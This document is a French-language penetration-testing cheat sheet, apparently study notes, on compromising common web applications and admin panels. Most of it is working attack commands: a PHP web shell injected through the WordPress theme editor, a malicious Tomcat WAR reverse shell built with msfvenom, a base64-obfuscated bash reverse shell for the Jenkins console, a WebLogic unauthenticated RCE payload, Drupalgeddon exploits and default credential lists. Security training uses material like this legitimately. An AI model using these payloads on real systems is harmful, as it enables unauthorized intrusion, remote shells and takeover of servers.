# 24 — Attacking Common Applications

## Objectifs
Identifier et exploiter les applications courantes : CMS (WordPress, Joomla, Drupal), serveurs d'application (Tomcat, Jenkins, WebLogic), outils d'infra (GitLab, Splunk, PRTG, Nagios), helpdesk (osTicket), etc.

---

## 1. Découverte

```bash
# Fingerprint
whatweb -a 3 http://<TARGET>
nmap -sCV -p- <TARGET>
curl -sI http://<TARGET>/

# Chemins typiques
for p in /wp-admin /administrator /user/login /manager/html /jenkins /gitlab /splunk /prtg /nagios /osticket /phpmyadmin; do
  echo "$(curl -s -o /dev/null -w '%{http_code}' http://<TARGET>$p) $p"
done
```

### Indices par application
| Application | Indices |
|---|---|
| WordPress | `/wp-login.php`, `/wp-content/`, `wp-json` |
| Joomla | `/administrator`, `/components/` |
| Drupal | `/user/login`, `CHANGELOG.txt` |
| Tomcat | `/manager/html`, erreur 404 Tomcat |
| Jenkins | `/jenkins`, `/script` |
| WebLogic | `/console`, port 7001 |
| GitLab | `/users/sign_in`, `/-/` |
| Splunk | port 8000/8089, `/en-US/account/login` |
| PRTG | port 8080, `/public/login.htm` |
| osTicket | `/scp/login.php` |

---

## 2. WordPress

```bash
# Énumération
wpscan --url http://<TARGET> --enumerate vp,vt,u --api-token <TOKEN>
wpscan --url http://<TARGET> --enumerate ap,at --plugins-detection aggressive

# Utilisateurs
curl http://<TARGET>/wp-json/wp/v2/users
curl http://<TARGET>/?author=1

# Brute force
wpscan --url http://<TARGET> --usernames admin --passwords <WORDLIST>

# Exploitation
# - Plugin vulnérable → RCE / LFI / SQLi (searchsploit)
# - Theme editor (admin) → PHP dans un template
# - Upload de plugin malveillant (admin)
```

```bash
# Shell via admin : Appearance → Theme Editor → 404.php
<?php system($_GET['c']); ?>
curl "http://<TARGET>/wp-content/themes/<THEME>/404.php?c=id"
```

### Plugin upload (admin)
```bash
# Zip d'un plugin avec un fichier PHP
zip plugin.zip shell.php
# Plugins → Add New → Upload → Activate
```

---

## 3. Joomla

```bash
# Version
curl -s http://<TARGET>/administrator/manifests/files/joomla.xml
curl -s http://<TARGET>/language/en-GB/en-GB.xml

# Scanner
joomscan -u http://<TARGET>

# Templates (admin) → PHP
# Extensions → Templates → edit index.php
# CVE fréquentes : com_fields SQLi, com_users, etc.
searchsploit joomla
```

---

## 4. Drupal

```bash
# Version
curl -s http://<TARGET>/CHANGELOG.txt | head
curl -s http://<TARGET>/core/CHANGELOG.txt

# Drupalgeddon2 (CVE-2018-7600)
python3 drupalgeddon2.py http://<TARGET>
# ou
msfconsole -q -x "use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS <TARGET>; run"

# Drupalgeddon3 (CVE-2018-7602)
```

---

## 5. Tomcat

```bash
# Manager
http://<TARGET>:8080/manager/html
# Credentials par défaut : tomcat:s3cret, admin:admin, tomcat:tomcat

# Brute force
hydra -L users.txt -P <WORDLIST> http://<TARGET>:8080/manager/html

# Déploiement de WAR (manager)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f war -o shell.war
curl -u 'tomcat:s3cret' --upload-file shell.war http://<TARGET>:8080/manager/text/deploy?path=/shell
curl http://<TARGET>:8080/shell/

# CVE-2020-1938 Ghostcat (AJP)
nmap -p8009 --script ajp-*
```

```bash
# WAR manuel
jar -cvf shell.war shell.jsp
```

---

## 6. Jenkins

```bash
# Version / accès
curl -s http://<TARGET>:8080/
# Script console (admin) → RCE
http://<TARGET>:8080/script

# Groovy
def cmd = "id".execute(); println cmd.text

# Reverse shell Groovy
String host="<LHOST>"; int port=4444;
String cmd="bash"; 
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
// ...

# Credentials par défaut : admin:admin
# CVE-2018-1000861, CVE-2019-1003000
```

### Script console one-liner
```groovy
"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9MSU9TVC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}".execute()
```

---

## 7. WebLogic

```bash
# Console
http://<TARGET>:7001/console

# CVE-2020-14882 / 14883 (RCE non auth)
curl "http://<TARGET>:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession('java.lang.Runtime.getRuntime().exec(\"id\")')"

# CVE-2019-2725, CVE-2017-10271
searchsploit weblogic
msfconsole -q -x "use exploit/multi/http/weblogic_admin_handle; ..."
```

---

## 8. GitLab

```bash
# Version
curl -s http://<TARGET>/help | grep -i version

# CVE-2021-22205 (ExifTool RCE, non auth)
python3 gitlab_exploit.py http://<TARGET>

# Accès authentifié → import de projet / CI
# RCE via pipeline .gitlab-ci.yml
```

---

## 9. Splunk

```bash
# Ports 8000 (web), 8089 (API)
# Credentials par défaut : admin:changeme

# RCE via recherche (admin)
# Dans l'interface : Settings → Search → ...
# Ou via l'API
curl -k -u admin:changeme https://<TARGET>:8089/services/search/jobs -d "search=| /bin/id"

# CVE-2023-46214 / 2024-  (script-based)
```

### Splunk via script
```bash
# Upload d'une app avec script malveillant (admin)
# ou recherche SPL :
| script python poc
```

---

## 10. PRTG / Nagios / osTicket

### PRTG
```bash
# Port 8080, admin par défaut
# CVE-2018-9276 (authentifié RCE), CVE-2023-*
# Notifications → EXE/Script → commande
```

### Nagios
```bash
# /nagios, credentials faibles
# Commandes via check_command
```

### osTicket
```bash
# /scp/login.php, /setup
# CVE-2020-  (LFI / SQLi)
searchsploit osticket
```

---

## 11. Autres applications fréquentes

| App | Vecteur |
|---|---|
| **phpMyAdmin** | SQL direct → INTO OUTFILE, `phpMyAdmin` CVE |
| **Adminer** | connexion DB locale → RCE via `LOAD DATA LOCAL` |
| **Confluence** | CVE-2023-22527 (RCE), CVE-2022-26134 (OGNL) |
| **Jira** | CVE-2019-8442, templates |
| **ColdFusion** | CVE-2023-26360, upload |
| **Exchange** | ProxyLogon / ProxyShell |
| **Zabbix** | CVE-2022-23131, SQLi |
| **Grafana** | CVE-2021-43798 (LFI), plugins |
| **Elasticsearch** | API ouverte → dump, script RCE |
| **Docker API** | port 2375 → `docker run --privileged` |

---

## 12. Méthodologie

1. **Identifier** l'app et sa version exacte.
2. Chercher **CVE** et PoC (`searchsploit`, GitHub, Nuclei).
3. Tester les **credentials par défaut**.
4. Chercher les **panneaux d'admin** et fonctionnalités d'upload / templates.
5. Exploiter → shell → privesc.
6. Nettoyer (plugins, war, scripts uploadés).

```bash
# Credentials par défaut
/usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv
```

---

## Checklist
- [ ] App et version identifiées
- [ ] Credentials par défaut testés
- [ ] CVE connues vérifiées et PoC testés
- [ ] Panneau admin trouvé
- [ ] Upload / template / script console exploité
- [ ] Shell obtenu
- [ ] Artefacts nettoyés
